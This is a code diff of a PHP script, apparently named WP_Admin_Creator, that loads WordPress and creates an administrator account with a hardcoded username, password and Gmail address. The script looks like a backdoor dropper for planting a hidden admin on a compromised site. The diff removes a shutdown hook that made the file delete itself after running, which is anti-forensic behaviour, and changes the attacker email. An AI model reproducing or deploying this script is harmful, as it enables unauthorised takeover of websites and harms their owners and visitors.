@@ -2,9 +2,6 @@
 error_reporting(E_ALL);
 ini_set('display_errors', 1);
 set_time_limit(60);
-register_shutdown_function(function() {
-    @unlink(__FILE__);
-});
 
 class WP_Admin_Creator {
     
@@ -134,7 +131,7 @@ if (!$creator->loadWordPress()) {
 
 $user_login = 'admings';
 $user_pass  = 'azdd9c123.66@';
-$user_email = 'peckadlegwtq@gmail.com';
+$user_email = 'peckadlegwta@gmail.com';
 $role       = 'administrator';
 
 if (username_exists($user_login) || email_exists($user_email)) {
